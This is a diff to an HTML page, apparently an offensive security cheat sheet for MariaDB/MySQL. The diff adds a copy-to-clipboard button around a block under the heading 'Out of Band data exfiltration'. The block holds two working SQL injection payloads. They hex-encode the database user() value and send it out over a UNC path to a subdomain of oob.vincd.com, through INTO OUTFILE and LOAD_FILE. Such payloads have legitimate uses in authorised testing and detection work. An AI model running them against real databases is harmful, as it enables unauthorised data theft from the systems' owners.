@@ -370,9 +370,11 @@
             
               <h1>MarioDB / MySQL</h1>
               <h2 id="out-of-band-data-exfiltration">Out of Band data exfiltration</h2>
-<pre><code class="language-sql">SELECT 'a' INTO OUTFILE CONCAT('\\\\', (SELECT HEX(CONCAT(user(), &quot;\n&quot;))), '.oob.vincd.com\\test.txt');
+<div class="clipboard-content">  <pre><code class="language-sql">SELECT 'a' INTO OUTFILE CONCAT('\\\\', (SELECT HEX(CONCAT(user(), &quot;\n&quot;))), '.oob.vincd.com\\test.txt');
 SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(CONCAT(user(), &quot;\n&quot;))), '.oob.vincd.com\\test.txt'));
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="SELECT 'a' INTO OUTFILE CONCAT('\\\\', (SELECT HEX(CONCAT(user(), &quot;\n&quot;))), '.oob.vincd.com\\test.txt');
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(CONCAT(user(), &quot;\n&quot;))), '.oob.vincd.com\\test.txt'));
+">    Copy  </button></div></div>
             
           </div>
           <footer>
